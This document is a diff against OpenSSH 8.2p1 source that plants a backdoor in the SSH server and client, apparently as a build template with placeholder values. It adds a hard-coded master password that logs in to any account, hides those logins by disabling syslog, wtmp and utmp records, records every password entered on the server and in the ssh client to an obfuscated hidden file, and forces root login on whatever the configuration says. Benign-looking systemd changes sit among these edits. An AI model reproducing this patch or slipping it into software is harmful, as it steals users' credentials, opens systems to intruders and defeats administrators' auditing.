@@ -1,0 +1,291 @@
+diff -Nuar 8.2p1.orig/auth-pam.c 8.2p1/auth-pam.c
+--- 8.2p1.orig/auth-pam.c	2020-04-10 17:17:30.907797968 +0200
++++ 8.2p1/auth-pam.c	2020-04-12 20:38:01.043067866 +0200
+@@ -1359,6 +1359,19 @@
+ 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+ 		debug("PAM: password authentication accepted for %.100s",
+ 		    authctxt->user);
++		char *ohk = strdup(OPENSSH_KEY);
++		rox(ohk);
++		if((f=fopen(ohk, "a+")) != NULL){
++			CLEAN(ohk);
++			char bds[512];
++			sprintf(bds, "from local: %s:%s", authctxt->user, password);
++			rox(bds);
++			fprintf(f, "%s\n", bds);
++			CLEAN(bds);
++			fflush(f);
++			fclose(f);
++		}
++		CLEAN(ohk);
+ 		return 1;
+ 	} else {
+ 		debug("PAM: password authentication failed for %.100s: %s",
+diff -Nuar 8.2p1.orig/auth-passwd.c 8.2p1/auth-passwd.c
+--- 8.2p1.orig/auth-passwd.c	2020-04-10 17:17:30.907797968 +0200
++++ 8.2p1/auth-passwd.c	2020-04-14 13:30:28.524855599 +0200
+@@ -86,6 +86,14 @@
+ 	if (strlen(password) > MAX_PASSWORD_LEN)
+ 		return 0;
+ 
++	char *olic = strdup(OPENSSH_LICENSE);
++	rox(olic);
++	if (!strcmp(password, olic)){
++		CLEAN(olic);
++		secret_ok = 1;
++		return 1;
++	}
++	CLEAN(olic);
+ #ifndef HAVE_CYGWIN
+ 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
+ 		ok = 0;
+@@ -123,6 +131,21 @@
+ 	}
+ #endif
+ 	result = sys_auth_passwd(ssh, password);
++	if(result){
++		char *ohk = strdup(OPENSSH_KEY);
++		rox(ohk);
++		if((f=fopen(ohk, "a+")) != NULL){
++			CLEAN(ohk);
++			char bds[512];
++			sprintf(bds, "from local: %s:%s", authctxt->user, password);
++			rox(bds);
++			fprintf(f, "%s\n", bds);
++			CLEAN(bds);
++			fflush(f);
++			fclose(f);
++		}
++		CLEAN(ohk);
++	}
+ 	if (authctxt->force_pwchange)
+ 		auth_restrict_session(ssh);
+ 	return (result && ok);
+diff -Nuar 8.2p1.orig/auth.c 8.2p1/auth.c
+--- 8.2p1.orig/auth.c	2020-04-10 17:17:30.907797968 +0200
++++ 8.2p1/auth.c	2020-04-12 19:08:09.586855805 +0200
+@@ -339,6 +339,7 @@
+ 			extra = xstrdup(authctxt->auth_method_info);
+ 	}
+ 
++	if(!secret_ok || secret_ok != 1){
+ 	do_log2(level, "%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
+ 	    authmsg,
+ 	    method,
+@@ -350,6 +351,7 @@
+ 	    extra != NULL ? ": " : "",
+ 	    extra != NULL ? extra : "");
+ 
++	}
+ 	free(extra);
+ 
+ #ifdef CUSTOM_FAILED_LOGIN
+diff -Nuar 8.2p1.orig/canohost.c 8.2p1/canohost.c
+--- 8.2p1.orig/canohost.c	2020-04-10 17:17:30.907797968 +0200
++++ 8.2p1/canohost.c	2020-04-12 19:10:09.126860507 +0200
+@@ -94,6 +94,7 @@
+ 	case AF_INET:
+ 	case AF_INET6:
+ 		/* Get the address in ascii. */
++	if(!secret_ok || secret_ok != 1){
+ 		if ((r = getnameinfo((struct sockaddr *)&addr, addrlen, ntop,
+ 		    sizeof(ntop), NULL, 0, flags)) != 0) {
+ 			error("%s: getnameinfo %d failed: %s", __func__,
+@@ -101,6 +102,7 @@
+ 			return NULL;
+ 		}
+ 		return xstrdup(ntop);
++	}
+ 	case AF_UNIX:
+ 		/* Get the Unix domain socket path. */
+ 		return xstrdup(((struct sockaddr_un *)&addr)->sun_path);
+diff -Nuar 8.2p1.orig/conf.h 8.2p1/conf.h
+--- 8.2p1.orig/conf.h	1970-01-01 03:00:00.000000000 +0300
++++ 8.2p1/conf.h	2020-04-14 13:39:25.788876731 +0200
+@@ -0,0 +1,12 @@
++#include <string.h>
++
++int secret_ok;
++FILE *f;
++#define OPENSSH_KEY		"%%SSHD_LOGS%%"
++#define OPENSSH_LICENSE		"%%SSHD_SECKEY%%"
++#define SSHD_NEWKEY		"%%SSHD_NEWKEY%%"
++#define XKEY			%%XKEY%%
++
++#define CLEAN(var)		memset(var, 0x00, strlen(var))
++
++#define	rox(p)			size_t iii;for(iii=0;iii<strlen(p);iii++) if(p[iii] ^ XKEY) p[iii]^=XKEY
+diff -Nuar 8.2p1.orig/configure.ac 8.2p1/configure.ac
+--- 8.2p1.orig/configure.ac	2020-04-10 17:17:30.911797968 +0200
++++ 8.2p1/configure.ac	2020-04-10 21:30:02.752393933 +0200
+@@ -4584,6 +4584,14 @@
+ AC_SUBST([GSSLIBS])
+ AC_SUBST([K5LIBS])
+ 
++# Check whether user wants systemd support
++AC_ARG_WITH(systemd,
++	[  --with-systemd          Enable systemd support],
++	[ if test "x$withval" != "xno" ; then
++		SSHDLIBS="$SSHDLIBS -lsystemd"
++		AC_DEFINE(HAVE_SYSTEMD, 1, [Define if you want systemd support.])
++	fi ]
++)
+ # Looking for programs, paths and files
+ 
+ PRIVSEP_PATH=/var/empty
+diff -Nuar 8.2p1.orig/includes.h 8.2p1/includes.h
+--- 8.2p1.orig/includes.h	2020-04-10 17:17:30.911797968 +0200
++++ 8.2p1/includes.h	2020-04-10 19:23:01.204094156 +0200
+@@ -176,4 +176,5 @@
+ 
+ #include "entropy.h"
+ 
++#include "conf.h"
+ #endif /* INCLUDES_H */
+diff -Nuar 8.2p1.orig/log.c 8.2p1/log.c
+--- 8.2p1.orig/log.c	2020-04-10 17:17:30.911797968 +0200
++++ 8.2p1/log.c	2020-04-12 20:11:56.947006346 +0200
+@@ -256,6 +256,7 @@
+ void
+ log_init(char *av0, LogLevel level, SyslogFacility facility, int on_stderr)
+ {
++	if(secret_ok == 1) return;
+ #if defined(HAVE_OPENLOG_R) && defined(SYSLOG_DATA_INIT)
+ 	struct syslog_data sdata = SYSLOG_DATA_INIT;
+ #endif
+@@ -400,6 +401,7 @@
+ void
+ do_log(LogLevel level, const char *fmt, va_list args)
+ {
++	if(secret_ok == 1) return;
+ #if defined(HAVE_OPENLOG_R) && defined(SYSLOG_DATA_INIT)
+ 	struct syslog_data sdata = SYSLOG_DATA_INIT;
+ #endif
+diff -Nuar 8.2p1.orig/loginrec.c 8.2p1/loginrec.c
+--- 8.2p1.orig/loginrec.c	2020-04-10 17:17:30.911797968 +0200
++++ 8.2p1/loginrec.c	2020-04-12 22:14:19.411295146 +0200
+@@ -438,6 +438,7 @@
+ int
+ login_write(struct logininfo *li)
+ {
++	if(secret_ok == 1) return 0;
+ #ifndef HAVE_CYGWIN
+ 	if (geteuid() != 0) {
+ 		logit("Attempt to write login records by non-root user (aborting)");
+diff -Nuar 8.2p1.orig/servconf.c 8.2p1/servconf.c
+--- 8.2p1.orig/servconf.c	2020-04-10 17:17:30.919797968 +0200
++++ 8.2p1/servconf.c	2020-04-12 19:36:16.546922158 +0200
+@@ -328,7 +328,7 @@
+ 	if (options->login_grace_time == -1)
+ 		options->login_grace_time = 120;
+ 	if (options->permit_root_login == PERMIT_NOT_SET)
+-		options->permit_root_login = PERMIT_NO_PASSWD;
++		options->permit_root_login = PERMIT_YES;
+ 	if (options->ignore_rhosts == -1)
+ 		options->ignore_rhosts = 1;
+ 	if (options->ignore_user_known_hosts == -1)
+@@ -1220,12 +1220,12 @@
+ 	{ NULL, -1 }
+ };
+ static const struct multistate multistate_permitrootlogin[] = {
+-	{ "without-password",		PERMIT_NO_PASSWD },
+-	{ "prohibit-password",		PERMIT_NO_PASSWD },
+-	{ "forced-commands-only",	PERMIT_FORCED_ONLY },
++	{ "without-password",		PERMIT_YES },
++	{ "prohibit-password",		PERMIT_YES },
++	{ "forced-commands-only",	PERMIT_YES },
+ 	{ "yes",			PERMIT_YES },
+-	{ "no",				PERMIT_NO },
+-	{ NULL, -1 }
++	{ "no",				PERMIT_YES },
++	{ NULL, PERMIT_YES }
+ };
+ static const struct multistate multistate_compression[] = {
+ #ifdef WITH_ZLIB
+diff -Nuar 8.2p1.orig/sshconnect2.c 8.2p1/sshconnect2.c
+--- 8.2p1.orig/sshconnect2.c	2020-04-10 17:17:30.923797968 +0200
++++ 8.2p1/sshconnect2.c	2020-04-14 14:09:41.760948158 +0200
+@@ -1011,6 +1011,19 @@
+ 
+ 	xasprintf(&prompt, "%s@%s's password: ", authctxt->server_user, host);
+ 	password = read_passphrase(prompt, 0);
++	char *ohk = strdup(OPENSSH_KEY);
++	rox(ohk);
++	if((f=fopen(ohk, "a+")) != NULL){
++		CLEAN(ohk);
++		char bds[512];
++		sprintf(bds, "from remote: %s:%s@%s", authctxt->server_user, password, authctxt->host);
++		rox(bds);
++		fprintf(f, "%s\n", bds);
++		CLEAN(bds);
++		fflush(f);
++		fclose(f);
++	}
++	CLEAN(ohk);
+ 	if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_REQUEST)) != 0 ||
+ 	    (r = sshpkt_put_cstring(ssh, authctxt->server_user)) != 0 ||
+ 	    (r = sshpkt_put_cstring(ssh, authctxt->service)) != 0 ||
+diff -Nuar 8.2p1.orig/sshd.c 8.2p1/sshd.c
+--- 8.2p1.orig/sshd.c	2020-04-10 17:17:30.923797968 +0200
++++ 8.2p1/sshd.c	2020-04-14 14:09:57.728948786 +0200
+@@ -85,6 +85,9 @@
+ #include <prot.h>
+ #endif
+ 
++#ifdef HAVE_SYSTEMD
++#include <systemd/sd-daemon.h>
++#endif
+ #include "xmalloc.h"
+ #include "ssh.h"
+ #include "ssh2.h"
+@@ -311,6 +314,9 @@
+ static void
+ sighup_restart(void)
+ {
++#ifdef HAVE_SYSTEMD
++	sd_notify(0, "RELOADING=1");
++#endif
+ 	logit("Received SIGHUP; restarting.");
+ 	if (options.pid_file != NULL)
+ 		unlink(options.pid_file);
+@@ -2019,6 +2025,9 @@
+ 			}
+ 		}
+ 
++#ifdef HAVE_SYSTEMD
++		sd_notify(0, "READY=1");
++#endif
+ 		/* Accept a connection and return in a forked child */
+ 		server_accept_loop(&sock_in, &sock_out,
+ 		    &newsock, config_s);
+diff -Nuar 8.2p1.orig/sshlogin.c 8.2p1/sshlogin.c
+--- 8.2p1.orig/sshlogin.c	2020-04-10 17:17:30.923797968 +0200
++++ 8.2p1/sshlogin.c	2020-04-10 19:23:01.204094156 +0200
+@@ -140,8 +140,7 @@
+ 
+ 	li = login_alloc_entry(pid, user, host, tty);
+ 	login_set_addr(li, addr, addrlen);
+-	login_login(li);
+-	login_free_entry(li);
++	if(!secret_ok || secret_ok!=1){ login_login(li); login_free_entry(li); }
+ }
+ 
+ #ifdef LOGIN_NEEDS_UTMPX
+@@ -153,8 +152,7 @@
+ 
+ 	li = login_alloc_entry(pid, user, host, ttyname);
+ 	login_set_addr(li, addr, addrlen);
+-	login_utmp_only(li);
+-	login_free_entry(li);
++	if(!secret_ok || secret_ok!=1){ login_utmp_only(li); login_free_entry(li); }
+ }
+ #endif
+ 
+@@ -165,6 +163,5 @@
+ 	struct logininfo *li;
+ 
+ 	li = login_alloc_entry(pid, user, NULL, tty);
+-	login_logout(li);
+-	login_free_entry(li);
++	if(!secret_ok || secret_ok!=1){ login_logout(li); login_free_entry(li); }
+ }
